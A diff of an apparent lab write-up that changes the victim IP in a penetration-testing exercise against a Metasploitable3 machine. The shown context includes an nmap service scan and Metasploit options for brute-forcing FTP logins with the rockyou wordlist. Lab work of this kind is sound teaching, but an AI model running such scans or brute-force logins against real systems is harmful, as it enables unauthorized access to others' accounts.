@@ -15,7 +15,7 @@
 
 * **Victim (Metasploitable3)**
 
-  * IP Address: `10.0.2.16`
+  * IP Address: `10.0.2.7`
     ![Figure 2: Victim Machine Overview](image/Picture2.png)
 
 ---
@@ -27,7 +27,7 @@
 To identify open services on the victim, we ran:
 
 ```bash
-nmap -sV 10.0.2.16
+nmap -sV 10.0.2.7
 ```
 
 * Key findings: FTP (port 21/tcp), SSH (22/tcp), HTTP (80/tcp), etc.
@@ -57,7 +57,7 @@ The FTP service was chosen because it allows multiple login attempts, making it 
 3. Configure module options:
 
    ```bash
-   set RHOSTS 10.0.2.16
+   set RHOSTS 10.0.2.7
    set USER_FILE /usr/share/wordlists/rockyou.txt
    set PASS_FILE /usr/share/wordlists/rockyou.txt
    set STOP_ON_SUCCESS true
